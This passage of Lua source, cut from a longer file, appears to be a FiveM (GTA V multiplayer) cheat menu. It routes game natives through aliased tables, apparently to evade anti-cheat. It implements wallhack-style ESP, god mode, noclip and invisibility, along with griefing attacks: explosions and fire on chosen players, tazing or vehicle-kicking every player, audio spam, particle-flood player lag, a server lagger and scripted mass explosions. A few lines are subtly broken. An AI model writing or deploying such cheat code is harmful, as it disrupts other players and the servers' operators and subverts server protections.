                               er = Fatasf.n.PlayerPedId()
                           end
                           if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(pPed), true) < CockMenu.ComboBoxesT.EspDist[CockMenu.ComboBoxesT.EspDistMultIndex] and pPed ~= er then
                               local dist = Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(pPed), true)
                               Fatasf.n.SetDrawOrigin(Fatasf.n.GetEntityCoords(pPed))
                               
               
                               Fatasf.n.DrawRect(0, -0.999 / dist, 0.53 / dist, 0.001, 255, 255, 255, 255)
                               Fatasf.n.DrawRect(0, 0.999 / dist, 0.53 / dist, 0.001, 255, 255, 255, 255)
                               Fatasf.n.DrawRect(-0.265 / dist, 0, 0.0006, 2.0 / dist, 255, 255, 255, 255)
                               Fatasf.n.DrawRect(0.265 / dist, 0, 0.0006, 2.0 / dist, 255, 255, 255, 255)
                           end
                       end
                       Fatasf.n.ClearDrawOrigin()
                   end
               end
               
                   if Cock.Menu.infos then
                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do
                           local player = Fatasf.n.GetPlayerPed(v)
                           if Cock.Menu.includeself then
                               er = nil
                           else
                               er = Fatasf.n.PlayerPedId()
                           end
                           if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(player), true) < CockMenu.ComboBoxesT.EspDist[CockMenu.ComboBoxesT.EspDistMultIndex] and player ~= er then
                               local playerX, playerY, playerZ = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(player))
                               local position = Fatasf.n.GetEntityCoords(player)
                               
                               local xx = CockT.Math.tonumber(CockT.Strings.format("%.2f", playerX))
                               local yy = CockT.Math.tonumber(CockT.Strings.format("%.2f", playerY))
                               local zz = CockT.Math.tonumber(CockT.Strings.format("%.2f", playerZ))
                               local pos = {x = xx, y = yy, z = zz}
               
                               local text = 'Nick: '..Fatasf.n.GetPlayerName(v)..' | Health: '..(Fatasf.n.GetEntityHealth(player) - 100)..'/100 | ID: '..Fatasf.n.GetPlayerServerId(v)..''
                               CockT.Global.DrawTextOnCoords(position.x, position.y, position.z+1.0, text, 255, 255, 255, 4, 0.10)
                           end
                       end
                   end
               
                   if Cock.Menu.displayradar then
                       CockT.Inv["Invoke"](CockT.Natives["DisplayRadar"], true)
                   end
   
               if Cock.Menu.skeletons then
                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do
                       local ped = Fatasf.n.GetPlayerPed(v)
                       local Pped = Fatasf.n.PlayerPedId()
                       if Cock.Menu.includeself then
                           er = nil
                       else
                           er = Fatasf.n.PlayerPedId()
                       end
                       if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(ped), true) < CockMenu.ComboBoxesT.EspDist[CockMenu.ComboBoxesT.EspDistMultIndex] and ped ~= er then
                           Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 31086, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 39317, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                           Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 39317, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 11816, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                           Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 11816, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 16335, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                           Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 11816, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 46078, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                           Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 16335, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 52301, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                           Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 46078, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 14201, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                           Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 46078, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 14201, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                           Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 39317, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 40269, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                           Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 39317, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 45509, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                           Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 40269, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 28252, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                           Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 45509, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 61163, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                           Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 28252, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                           Fatasf.n.DrawLine(Functions.f.GetPedBoneCoords(ped, 61163, 0.0, 0.0, 0.0), Functions.f.GetPedBoneCoords(ped, 18905, 0.0, 0.0, 0.0), 255, 255, 255, 255)
                       end
                       --[[if ped ~= Fatasf.n.PlayerPedId() then
                           CockT.Inv["Invoke"](CockT.Natives['DrawMarker'], 28, Functions.f.GetPedBoneCoords(ped, 0x796E, 0.0, 0.0, 0.0), 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 0.3 / GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(ped), true), 0.3 / GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(ped), true), 0.4 / GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(ped), true), 255, 255, 255, 255, false, false, 2, nil, nil, true)   --false, false, 2, nil, nil, true, true)
                       end]]
                   end 
               end
       
               if Cock.Menu.Crosshair then
                   Fatasf.n.RequestStreamedTextureDict('srange_gen', true)
                   Fatasf.n.DrawSprite('srange_gen', 'hit_cross', 0.5, 0.5, 0.006, 0.006 * 2.0, 45.0, 255, 255, 255, 255)		--srange_gen@hit_cross
               end
               if Cock.Menu.showcoords then
                   local playerPed = Fatasf.n.PlayerPedId()
                   local playerX, playerY, playerZ = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(playerPed))
                   local playerH = Fatasf.n.GetEntityHeading(playerPed)
                   Functions.f.DrawTextTest(("~b~X~w~: %s ~b~Y~w~: %s ~b~Z~w~: %s ~b~H~w~: %s"):format(CockMeni.Functions.FormatCoord(playerX), CockMeni.Functions.FormatCoord(playerY), CockMeni.Functions.FormatCoord(playerZ), CockMeni.Functions.FormatCoord(playerH)), false, 0.5, 0, 0.5, 0)
               end
               if Cock.Menu.roadetector then
                   local playerX, playerY, playerZ = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()))
                   local ActualRoad = Fatasf.n.GetStreetNameFromHashKey(Fatasf.n.GetStreetNameAtCoord(playerX, playerY, playerZ))
                   Fatasf.n.DrawRect(0.21, 0.798, 0.101, 0.0365, 255, 255, 255, 222)
                   Fatasf.n.DrawRect(0.21, 0.798, 0.1, 0.035, 0, 0, 0, 222)
                   Functions.f.DrawTextTest(ActualRoad, false, 0.35, 0, 0.21, 0.785)
               end
               if Cock.Menu.force3rdper then
                   Fatasf.n.SetFollowPedCamViewMode(0)
                   CockT.Inv["Invoke"](CockT.Natives['SetFollowVehicleCamViewMode'], 0)
                   CockT.Inv["Invoke"](CockT.Natives['DisableFirstPersonCamThisFrame'])
               end
               
               if Cock.Menu.forcedriveby then
                   CockT.Inv["Invoke"](CockT.Natives['SetPlayerCanDoDriveBy'], Fatasf.n.PlayerPedId(), true)
               end
               
               if Cock.Menu.rainbowworld then
                   local coords = Fatasf.n.GetPedBoneCoords(Fatasf.n.PlayerPedId(), 0x796E, 0.0, 0.0, 0.0)
                   local rgb = Functions.f.RGBRainbow(1.0)
                   CockT.Inv["Invoke"](CockT.Natives['DrawLightWithRangeAndShadow'], coords.x, coords.y, coords.z + 3.0, rgb.r, rgb.g, rgb.b, 1000.0, 80.0)
               end
               
               if Cock.Menu.tinyplayer then
                   Fatasf.n.SetPedConfigFlag(Fatasf.n.PlayerPedId(), 223, true)
               else
                   Fatasf.n.SetPedConfigFlag(Fatasf.n.PlayerPedId(), 223, false)
               end
   
               if Cock.Menu.Slowmotion then
                   CockT.Inv["Invoke"](CockT.Natives['SetTimeScale'], 0.35)
               else
                   CockT.Inv["Invoke"](CockT.Natives['SetTimeScale'], 1.0)
               end
       
               if Cock.Menu.SJump then
                   Fatasf.n.SetSuperJumpThisFrame(Fatasf.n.PlayerId()) 
               end
   
               if Cock.Menu.taskjump and not Fatasf.n.IsPedInAnyVehicle(Fatasf.n.PlayerPedId()) then
                   if Fatasf.n.IsDisabledControlPressed(1, CockT.Keys["SPACE"]) then
                       CockT.Inv["Invoke"](CockT.Natives['TaskJump'], Fatasf.n.PlayerPedId(), true)
                       CockT.Inv["Wait"](150)
                   end
               end
   
               if Cock.Menu.fastswim then
                   CockT.Inv["Invoke"](CockT.Natives['SetSwimMultiplierForPlayer'], Fatasf.n.PlayerId(), 1.49)
               else
                   CockT.Inv["Invoke"](CockT.Natives['SetSwimMultiplierForPlayer'], Fatasf.n.PlayerId(), 1.0)
               end
               
               if Cock.Menu.antidrowing then
                   CockT.Inv["Invoke"](CockT.Natives['SetPedDiesInWater'], Fatasf.n.PlayerPedId(), false)
               end
   
               if Cock.Menu.antihead then
                   CockT.Inv["Invoke"](CockT.Natives['SetPedSuffersCriticalHits'], Fatasf.n.PlayerPedId(), false)
               else
                   CockT.Inv["Invoke"](CockT.Natives['SetPedSuffersCriticalHits'], Fatasf.n.PlayerPedId(), true)
               end
   
               if Cock.Menu.fakedead then
                   Fatasf.n.SetPedToRagdoll(Fatasf.n.PlayerPedId(), 4000, 5000, 0, true, true, true)
               end
               if Cock.Menu.antistungun then
                   CockT.Inv["Invoke"](CockT.Natives['SetPedMinGroundTimeForStungun'], Fatasf.n.PlayerPedId(), 0)
               elseif not Cock.Menu.antistungun then
                   CockT.Inv["Invoke"](CockT.Natives['SetPedMinGroundTimeForStungun'], Fatasf.n.PlayerPedId(), 3600)
               end
   
               if Cock.Menu.noragdoll then
                   CockT.Inv["Invoke"](CockT.Natives['SetPedCanRagdoll'], Fatasf.n.PlayerPedId(), true)
               else
                   CockT.Inv["Invoke"](CockT.Natives['SetPedCanRagdoll'], Fatasf.n.PlayerPedId(), true)
               end
               
               if Cock.Menu.wantedlevel then
                   CockT.Inv["Invoke"](CockT.Natives['SetPlayerWantedLevel'], Fatasf.n.PlayerId(), Cock.Sliders['WantedLVL'].value, false)
                   CockT.Inv["Invoke"](CockT.Natives['SetPlayerWantedLevelNow'], Fatasf.n.PlayerId())
               end
               
               if Cock.Menu.superrun then
                   if Fatasf.n.IsDisabledControlPressed(0, 34) or Fatasf.n.IsDisabledControlPressed(0, 33) or Fatasf.n.IsDisabledControlPressed(0, 32) or Fatasf.n.IsDisabledControlPressed(0, 35) then
                       Fatasf.n.SetEntityVelocity(Fatasf.n.PlayerPedId(), Fatasf.n.GetOffsetFromEntityInWorldCoords(Fatasf.n.PlayerPedId(), 0.0, 10.5, GetEntityVelocity(Fatasf.n.PlayerPedId())[3]) - Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()))
                   end
               end
               
               if Cock.Menu.ExtraJump then
                   if Fatasf.n.IsDisabledControlJustPressed(0, 22) then
                       CockT.Inv["Invoke"](CockT.Natives['ApplyForceToEntity'], Fatasf.n.PlayerPedId(), 3, 0.0, 0.0, 25.0, 0.0, 0.0, 0.0, 0, 0, 0, 1, 1, 1)
                   end
               end 
       
               if Cock.Menu.infroll then
                   for i = 0, 3 do
                       CockT.Inv["Invoke"](CockT.Natives['StatSetInt'], Fatasf.n.GetHashKey("mp" .. i .. "_shooting_ability"), 9999, true)
                       CockT.Inv["Invoke"](CockT.Natives['StatSetInt'], Fatasf.n.GetHashKey("sp" .. i .. "_shooting_ability"), 9999, true)
                   end
               end
   
               if Cock.Menu.maxstamina then
                   CockT.Inv["Invoke"](CockT.Natives['ResetPlayerStamina'], Fatasf.n.PlayerId())
               end
   
               if Cock.Menu.SemiGodmode then
                   Fatasf.n.SetEntityHealth(Fatasf.n.PlayerPedId(), 200)
               end
   
               --[[if Cock.Menu.godmodeglife then
                   Fatasf.n.SetEntityOnlyDamagedByPlayer(Fatasf.n.PlayerPedId(), true)
                   CockT.Global.TriggerCustomEvent(true, "c6cf642b8f1cac1101e23a06aa63600e:setI", true)
               elseif not Cock.Menu.godmodeglife then
                   Fatasf.n.SetEntityOnlyDamagedByPlayer(Fatasf.n.PlayerPedId(), false)
                   --CockT.Global.TriggerCustomEvent(true, "c6cf642b8f1cac1101e23a06aa63600e:setI", false)
               end]]
               if Cock.Menu.glifeunlammo then
                   --local _, gun = Fatasf.n.GetCurrentPedWeapon(Fatasf.n.PlayerPedId())
                   --Fatasf.n.SetPedAmmo(Fatasf.n.PlayerPedId(), gun, 30)
               end
               if Cock.Menu.plootesp then
                   Functions.f.PlayersLootEsp()
               end
               if Cock.Menu.getlootglife then
                   Functions.f.GlifeKillAllPeds()
               end
               if Cock.Menu.getlootglife2 then
                   Functions.f.GlifeKillAllPeds2()
               end
               
       
                   if Cock.Menu.AFK and not walking then
                       walking = true
                       local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                   
                       if  Fatasf.n.DoesEntityExist(veh) then
                           CockT.Inv["Invoke"](CockT.Natives['TaskVehicleDriveWander'], Fatasf.n.PlayerPedId(), veh, 40.0, 0)
                       else
                           CockT.Inv["Invoke"](CockT.Natives['TaskWanderStandard'], Fatasf.n.PlayerPedId(), 10.0, 10)
                       end
                   end
                   
                   if not Cock.Menu.AFK and walking then
                       Fatasf.n.ClearPedTasks(Fatasf.n.PlayerPedId())
                       walking = false
                   end
       
               if Cock.Menu.NClip then
                   CockMeni.Functions.instructbutton()
                   local currentSpeed = CockMenu.ComboBoxesT.NCSpeed[CockMenu.ComboBoxesT.NCSpeedLengMult]--1.0
                   noclipEntity =
                   Fatasf.n.IsPedInAnyVehicle(Fatasf.n.PlayerPedId(), false) and Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.PlayerPedId()) or Fatasf.n.PlayerPedId()
                   Fatasf.n.FreezeEntityPosition(Fatasf.n.PlayerPedId(), true)
                   Fatasf.n.SetEntityInvincible(Fatasf.n.PlayerPedId(), true)
                   
                   local newPos = Fatasf.n.GetEntityCoords(entity)
           
                   Fatasf.n.DisableControlAction(0, 32, true) --MoveUpOnly
                   Fatasf.n.DisableControlAction(0, 268, true) --MoveUp
                   
                   Fatasf.n.DisableControlAction(0, 31, true) --MoveUpDown
           
                   Fatasf.n.DisableControlAction(0, 269, true) --MoveDown
                   Fatasf.n.DisableControlAction(0, 33, true) --MoveDownOnly
                   
                   Fatasf.n.DisableControlAction(0, 266, true) --MoveLeft
                   Fatasf.n.DisableControlAction(0, 34, true) --MoveLeftOnly
                   
                   Fatasf.n.DisableControlAction(0, 30, true) --MoveLeftRight
           
                   Fatasf.n.DisableControlAction(0, 267, true) --MoveRight
                   Fatasf.n.DisableControlAction(0, 35, true) --MoveRightOnly
                   
                   Fatasf.n.DisableControlAction(0, 44, true) --Cover
                   Fatasf.n.DisableControlAction(0, 20, true) --MultiplayerInfo
                   
                   yoff = 0.0
                   zoff = 0.0
                   
                   if Fatasf.n.IsDisabledControlPressed(0, 32) then
                       yoff = 0.5
                   end
                   if Fatasf.n.IsDisabledControlPressed(0, 33) then
                       yoff = -0.5
                   end
                   if Fatasf.n.IsDisabledControlPressed(0, 34) then
                       Fatasf.n.SetEntityHeading(Fatasf.n.PlayerPedId(), Fatasf.n.GetEntityHeading(Fatasf.n.PlayerPedId()) + 3.0)
                   end
                   if Fatasf.n.IsDisabledControlPressed(0, 35) then
                       Fatasf.n.SetEntityHeading(Fatasf.n.PlayerPedId(), Fatasf.n.GetEntityHeading(Fatasf.n.PlayerPedId()) - 3.0)
                   end
                   if Fatasf.n.IsDisabledControlPressed(0, 44) then
                       zoff = 0.21
                   end
                   if Fatasf.n.IsDisabledControlPressed(0, 20) then
                       zoff = -0.21
                   end
       
                   if Fatasf.n.IsDisabledControlPressed(0, 21) then
                       currentSpeed = 8
                   end
       
                   if Fatasf.n.IsDisabledControlPressed(0, 210) then
                       currentSpeed = 0.1
                   end
                   
                   local newPos =
                       Fatasf.n.GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))
                   
                       local heading = Fatasf.n.GetEntityHeading(noclipEntity)
                       Fatasf.n.SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
                       Fatasf.n.SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
                       Fatasf.n.SetEntityHeading(noclipEntity, heading)
                       
                       Fatasf.n.SetEntityCollision(noclipEntity, false, false)
                       Fatasf.n.SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)
                       
                       Fatasf.n.FreezeEntityPosition(noclipEntity, false)
                       Fatasf.n.SetEntityInvincible(noclipEntity, false)
                       Fatasf.n.SetEntityCollision(noclipEntity, true, true)  
               end
               if not CockT.Global.CheckIfResourceExist('gtalife-z') then
                   if Cock.Menu.Godmode then
                       Functions.f.FvckinDooogInvincibleglifeshit(true)
                   elseif not Cock.Menu.Godmode then 
                       Functions.f.FvckinDooogInvincibleglifeshit(false)
                   end
               end
       
               if Cock.Menu.LaunchPlayer then
                   Fatasf.n.AddExplosion(Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)), 13, 1.0, false, true, 0.0)
               end
   
               if Cock.Menu.SpaceX2 then
                   Fatasf.n.AddExplosion(Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)), 14, 1.0, false, true, 0.0)
               end
   
               if Cock.Menu.giveexplosiveammo then
                   local ret, position = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)) 
                   if ret then 
                       Fatasf.n.AddExplosion(position.x, position.y, position.z, 7, 100.0, true, false, 0)
                   end
               end
   
               if Cock.Menu.givemolotovammo then
                   local ret, position = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)) 
                   if ret then 
                       Fatasf.n.AddExplosion(position.x, position.y, position.z, 3, 100.0, true, false, 0)
                   end
               end
   
               if Cock.Menu.givepropammo then
                   local ret, position = Fatasf.n.GetPedLastWeaponImpactCoord(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer)) 
                   if ret then 
                       local Objects = {'prop_beach_fire', 'prop_atm_01', 'prop_atm_02', 'prop_aircon_s_07a', 'prop_prop_tree_01', 'prop_prop_tree_02'}
                       local objhash = Fatasf.n.GetHashKey(Objects[CockT.Math.random(#Objects)])
                       Fatasf.n.CreateObject(objhash, position.x, position.y, position.z, true, true, true)
                   end
               end
               
               if Cock.Menu.tazeloop then
                   CockT.Global.TazePlayer(CockT.Global.SelectedPlayer)
               end
               if Cock.Menu.kickfromveh then
                   CockT.Global.KickFromVehicle(CockT.Global.SelectedPlayer)
               end
               if Cock.Menu.earrape then
                   CockT.Global.EarRape()
               end
   
               --
               if Cock.Menu.invisible then
                   Fatasf.n.SetEntityVisible(Fatasf.n.PlayerPedId(), false, false) 
                   CockT.Inv["Invoke"](CockT.Natives['SetEntityLocallyVisible'], Fatasf.n.PlayerPedId(), true)  
               else 
                   Fatasf.n.SetEntityVisible(Fatasf.n.PlayerPedId(), true, true) 
                   CockT.Inv["Invoke"](CockT.Natives['ResetEntityAlpha'], Fatasf.n.PlayerPedId())
               end
       
               if Cock.Menu.lagplayer then
                       local ped = Fatasf.n.GetPlayerPed(i)
                       local pedcoords = Fatasf.n.GetEntityCoords(ped)
                       Fatasf.n.RequestNamedPtfxAsset("scr_agencyheist")
                       Fatasf.n.UseParticleFxAsset("scr_agencyheist")
                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "scr_fbi_dd_breach_smoke", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
                       
                       Fatasf.n.RequestNamedPtfxAsset("core")
                       Fatasf.n.UseParticleFxAsset("core")
                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "exp_air_molotov", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
                   
                       Fatasf.n.RequestNamedPtfxAsset("scr_rcbarry1")
                       Fatasf.n.UseParticleFxAsset("scr_rcbarry1")
                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "scr_alien_teleport", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
               
                       Fatasf.n.RequestNamedPtfxAsset("scr_trevor3")
                       Fatasf.n.UseParticleFxAsset("scr_trevor3")
                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "scr_trev3_c4_explosion", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
       
                       Fatasf.n.RequestNamedPtfxAsset("cut_finale1")
                       Fatasf.n.UseParticleFxAsset("cut_finale1")
                       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "cs_finale1_car_explosion", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
               end	
   
               if Cock.Menu.fireonplayer then
                   local coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer))
                   local dict = "core"
                   Fatasf.n.RequestNamedPtfxAsset(dict)
                   while not Fatasf.n.HasNamedPtfxAssetLoaded(dict) do
                       CockT.Inv["Wait"](0)
                   end
                   Fatasf.n.UseParticleFxAsset(dict)
                   Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("ent_sht_petrol_fire", coords.x, coords.y, coords.z, 0, 0, 0, 5.0, 0, 0, 0)
                   CockT.Inv["Wait"](10)
               end
   
               if Cock.Menu.Clownonplayer then
                   local coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer))
                   local dict = "scr_rcbarry2"
                   Fatasf.n.RequestNamedPtfxAsset(dict)
                   while not Fatasf.n.HasNamedPtfxAssetLoaded(dict) do
                       CockT.Inv["Wait"](0)
                   end
                   Fatasf.n.UseParticleFxAsset(dict)
                   Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("scr_clown_appears", coords.x, coords.y, coords.z, 0, 0, 0, 5.0, 0, 0, 0)
                   CockT.Inv["Wait"](10)
               end
   
               if Cock.Menu.Spectate2 then
                   local oldcoords = Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId())
                   local Player = Fatasf.n.PlayerPedId()
                   --oldcoords
                   local ped = Fatasf.n.ClonePed(Player, true, false, false)
                   while Cock.Menu.Spectate2 do
                       CockT.Inv["Wait"](0)
                       local TargetCoords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(CockT.Global.SelectedPlayer))
                       Fatasf.n.SetEntityVisible(Player, false, false)
                       CockT.Inv["Invoke"](CockT.Natives['SetEntityAlpha'], Player, 0)
                       Fatasf.n.SetEntityCoordsNoOffset(Player, TargetCoords.x, TargetCoords.y, TargetCoords.z+2.2, true, true, true)
                       if not Cock.Menu.Spectate2 then
                           Fatasf.n.SetEntityCoordsNoOffset(Player, oldcoords.x, oldcoords.y, oldcoords.z, true, true, true)
                           Fatasf.n.SetEntityVisible(Player, true, true)
                           CockT.Inv["Invoke"](CockT.Natives['ResetEntityAlpha'], Player)
                           Fatasf.n.DeleteEntity(ped)
                       end
                   end
               end
       
               if Cock.Menu.burnplayercar then
                   CockMeni.Functions.BurnPlayerCar(CockT.Global.SelectedPlayer)
               end
       
               if Cock.Menu.DisableAllEnginesLoop then
                   Functions.f.DisableAllEngines()
               end  
   
               if Cock.Menu.explodemissionrow then
                   CockT.Global.ExplodeMissionrow()
               end
   
               if Cock.Menu.explodegrove then
                   local ppid = Fatasf.n.PlayerPedId()
                   --Fatasf.n.SetEntityCoords(ppid, 99.99, -1068.48, 28.3)
                   Fatasf.n.AddExplosion(124.39, -1929.7, 22.0, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(120.19, -1932.38, 20.74, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(120.41, -1937.65, 20.75, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(119.18, -1946.69, 20.75, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(115.06, -1953.9, 20.75, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(116.23, -1957.94, 20.87, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(111.54, -1961.41, 20.95, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(101.42, -1959.11, 20.08, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(95.92, -1959.12, 20.75, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(86.24, -1971.49, 20.75, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(89.41, -1959.04, 20.75, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(81.24, -1952.1, 20.82, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(76.76, -1958.51, 20.77, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(78.68, -1947.91, 21.17, 20.75, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(78.59, -1939.9, 20.88, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(74.84, -1932.41, 20.84, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(69.07, -1923.82, 21.23, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(79.81, -1905.57, 21.43, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(91.07, -1916.78, 20.77, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(94.26, -1929.64, 20.8, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(102.07, -1938.0, 20.8, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(103.62, -1945.58, 20.77, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(111.27, -1936.94, 20.79, 5, 100.0, true, false, 0.0)
       
                   Fatasf.n.AddExplosion(81.51, -1919.13, 20.94, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(80.14, -1931.2, 20.72, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(96.44, -1927.15, 20.7, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(112.42, -1931.04, 20.61, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(114.67, -1943.08, 20.68, 5, 100.0, true, false, 0.0)
                   Fatasf.n.AddExplosion(102.12, -1951.71, 20.6, 5, 100.0, true, false, 0.0)
                   local gox_dict = "scr_trevor3"					
                   Fatasf.n.RequestNamedPtfxAsset(gox_dict)					
                   while not Fatasf.n.HasNamedPtfxAssetLoaded(gox_dict) do						
                       CockT.Inv["Wait"](10)				
                   end
                   Fatasf.n.UseParticleFxAsset(gox_dict)
                   Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "scr_trev3_c4_explosion", 99.57, -1937.6, 20.8,0,0,0,100.0,0,0,0)
               end
   
               if Cock.Menu.lagserver then
                   CockT.Global.ServerLagger()
               end
   
               if Cock.Menu.tazeloopall then
                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                       CockT.Global.TazePlayer(Fatasf.n.GetPlayerPed(i))
                   end
               end
               
               if Cock.Menu.kickfromvehall then
                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                       Fatasf.n.ClearPedTasksImmediately(Fatasf.n.GetPlayerPed(i))
                   end
               end
               
               if Cock.Menu.earrapeall then
                   for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                       CockT.Global.EarRape()
                   end
               end
               
   
               if CockMeni.Functions.fov then
                   Fatasf.n.RequestStreamedTextureDict("mpmissmarkers256", true)
                   Fatasf.n.DrawSprite("mpmissmarkers256","corona_shade",0.5,0.5,CockMenu.ComboBoxesT.Fov[CockMenu.ComboBoxesT.FovMultIndex] / 10 / 150,CockMenu.ComboBoxesT.Fov[CockMenu.ComboBoxesT.FovMultIndex] / 10 / 150 * 1.8,0.0,90,90,90,90)
               end
               if CockMeni.Functions.Carkiller then
                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                       local pPed = Fatasf.n.GetPlayerPed(v)
                       local Rotation = Fatasf.n.GetEntityRotation(k)
                       local Direct = CockMeni.Functions.RotationToDirection(Rotation)
